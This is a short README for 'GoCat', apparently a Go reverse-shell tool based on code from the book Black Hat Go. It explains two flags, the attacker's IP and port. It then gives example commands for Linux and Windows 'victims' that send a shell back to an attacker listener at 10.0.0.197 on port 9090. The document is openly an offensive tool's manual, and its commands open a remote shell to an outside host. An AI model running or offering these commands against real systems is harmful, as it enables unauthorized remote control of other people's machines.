# GoCat
A self-contained implementation of a reverse shell (netcat-like). It is an improvement based on the source code found on the book blackhat Go 

## Author
Alan Lacerda (alacerda) | intruderLabs team

## Usage
The command accepts 2 parameter:

-p string

        Port where the attacker is expecting the reverse shell back.

-s string

        Attacker's IP address to send the shell back.

### Examples
If the attacker's IP address is 10.0.0.197 and the attacker started a listener on TCP port 9090 waiting for a connection back from the victim:

#### Linux Victim
./gocat -s 10.0.0.197 -p 9090

#### Windows victim
gocat.exe -s 10.0.0.197 -p 9090
